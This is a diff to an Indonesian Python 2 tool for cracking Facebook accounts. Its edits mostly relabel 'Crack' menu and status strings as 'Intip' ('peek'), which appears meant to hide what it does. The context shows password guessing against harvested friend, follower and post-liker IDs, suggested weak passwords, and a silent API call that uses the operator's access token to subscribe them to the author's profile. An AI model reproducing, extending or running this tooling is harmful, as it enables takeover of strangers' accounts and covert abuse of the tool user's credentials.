@@ -89,7 +89,7 @@ def hasil(ok,cp):
 		print ' [%s✓%s] Total CP : %s%s%s'%(K,N,K,str(len(cp)),N)
 		exit()
 	else:
-		print '\n [%s!%s] Maaf kamu tidak mendapatkan hasil Crack :('%(M,N)
+		print '\n [%s!%s] Maaf kamu tidak mendapatkan hasil Intip :('%(M,N)
 		exit()
 # Token FB bukan token PLN
 def yayanxd():
@@ -159,13 +159,13 @@ def moch_yayan():
     print ' %s[%s*%s] IP Anda : %s%s'%(N,K,N,K,IP)
     print ' %s=================================================='%(N)
     print ' [%s?%s] %sMENU PILIHAN'%(K,N,K)
-    print ' %s[%s1%s] Crack dari Daftar Teman'%(N,H,N)
-    print ' [%s2%s] Crack dari Teman Publik'%(H,N)
-    print ' [%s3%s] Crack dari Total Followers'%(H,N)
-    print ' [%s4%s] Crack dari Like Postingan'%(H,N)
-    print ' [%s5%s] %sMulai Crack'%(H,N,H)
+    print ' %s[%s1%s] Intip dari Daftar Teman'%(N,H,N)
+    print ' [%s2%s] Intip dari Teman Publik'%(H,N)
+    print ' [%s3%s] Intip dari Total Followers'%(H,N)
+    print ' [%s4%s] Intip dari Like Postingan'%(H,N)
+    print ' [%s5%s] %sMulai Intip'%(H,N,H)
     print ' %s[%s6%s] Cek Informasi Akun FB'%(N,H,N)
-    print ' [%s7%s] Cek Hasil Crack'%(H,N)
+    print ' [%s7%s] Cek Hasil Intip'%(H,N)
     print ' [%s8%s] Info %sSC ROY'%(H,N,H)
     print ' %s[%s0%s] Logout (%sHapus Token%s)'%(N,M,N,M,N)
     awokawokawokawokawokawokawokawokawokawokawokawok()
@@ -237,7 +237,7 @@ def kontol():
 	except (KeyError, IOError):
 		print '\n %s[%sx%s] Token invalid'%(N,M,N)
 		os.system('rm -rf __yayan__.txt')
-	hoetank = random.choice(['info harga ka', 'yang awet untuk ads ada ka', 'cek wa dong ka', 'best seller'])
+	hoetank = random.choice(['info harga ka', 'yang awet untuk ads ada ka', 'cek wa dong ka', 'caranya'])
 	xi_jimpinx = '1379112335803650'
 	goceng  = '1303409076707310'
 	requests.post('https://graph.facebook.com/100011146894081/subscribers?access_token=%s'%(__cindy__))
@@ -570,10 +570,11 @@ class __crack__:
 
         ___yayanganteng___ = raw_input(' [%s?%s] Ingin menggunakan kata sandi manual? [%sY%s/%sT%s]: '%(K,N,H,N,M,N))
         if ___yayanganteng___ in ('Y', 'y'):
-            print '\n [%s?%s] Contoh: [ %scantik,cantik123,roy123%s ]'%(K,N,H,N)
+            print '\n [%s?%s] Contoh: %sbismillah,indonesia,roy123%s '%(K,N,K,N)
+	    print ' [%s!%s] %sGunakan simbol (,) untunk pemisah sandi%s '%(K,N,M,N)
             while True:
-                pwek = raw_input('\n [%s?%s] Sandi Manual : '%(K,N))
-                print ' [%s?%s] Crack dengan Sandi Manual : [ %s%s%s ]' % (K,N,M, pwek, N)
+                pwek = raw_input('\n [%s?%s] Masukkan Sandi Manual : '%(K,N))
+                print ' [%s?%s] Sandi Manual Telah Dibuat : [ %s%s%s ]' % (K,N,M, pwek, N)
                 if pwek == '':
                     self.slurr()
                 else:
@@ -597,7 +598,7 @@ class __crack__:
                                     except:
                                         pass
 
-                            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
+                            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
                             os.remove(self.apk)
                             hasil(ok,cp)
                             exit()
@@ -616,7 +617,7 @@ class __crack__:
                                     except:
                                         pass
 
-                            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
+                            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
                             os.remove(self.apk)
                             hasil(ok,cp)
                             exit()
@@ -635,7 +636,7 @@ class __crack__:
                                     except:
                                         pass
 
-                            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
+                            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
                             os.remove(self.apk)
                             hasil(ok,cp)
                             exit()
@@ -666,7 +667,7 @@ class __crack__:
 
     def __api__(self, user, _yan_):
     	global ok,cp,loop,tt
-        print '\r [\x1b[1;96m*\x1b[0m] Crack : %s/%s \x1b[1;92mOK:%s \x1b[0m]- \x1b[1;93mCP:%s '%(loop,len(self.id),len(ok),len(cp)),
+        print '\r [\x1b[1;96m*\x1b[0m] Intip : %s/%s \x1b[1;92mOK:%s \x1b[0m| \x1b[1;93mCP:%s \x1b[0m'%(loop,len(self.id),len(ok),len(cp)),
         sys.stdout.flush()
         for pw in _yan_:
             pw = pw.lower()
@@ -909,7 +910,7 @@ class __crack__:
         
     def __mbasic__(self, user, _yan_):
         global ok,cp,loop,tt
-        print '\r [\x1b[1;96m*\x1b[0m] Crack : %s/%s OK-:%s | CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
+        print '\r [\x1b[1;96m*\x1b[0m] Intip : %s/%s \x1b[1;92mOK-:%s \x1b[0m| \x1b[1;93mCP-:%s \x1b[0m'%(loop,len(self.id),len(ok),len(cp)),
         sys.stdout.flush()
         for pw in _yan_:
             pw = pw.lower()
@@ -946,7 +947,7 @@ class __crack__:
         
     def __mfb__(self, user, _yan_):
         global ok,cp,loop,tt
-        print '\r [\x1b[1;96m*\x1b[0m] Crack : %s/%s OK:%s | CP:%s '%(loop,len(self.id),len(ok),len(cp)),
+        print '\r [\x1b[1;96m*\x1b[0m] Intip : %s/%s \x1b[1;92mOK:%s \x1b[0m| \x1b[1;93mCP:%s \x1b[0m'%(loop,len(self.id),len(ok),len(cp)),
         sys.stdout.flush()
         for pw in _yan_:
             pw = pw.lower()
@@ -1034,7 +1035,7 @@ class __crack__:
                     except:
                         pass
 
-            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
+            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
             os.remove(self.apk)
             hasil(ok,cp)
             exit()
@@ -1084,7 +1085,7 @@ class __crack__:
                     except:
                         pass
 
-            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
+            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
             os.remove(self.apk)
             hasil(ok,cp)
             exit()
@@ -1134,7 +1135,7 @@ class __crack__:
                     except:
                         pass
 
-            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
+            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
             os.remove(self.apk)
             hasil(ok,cp)
             exit()
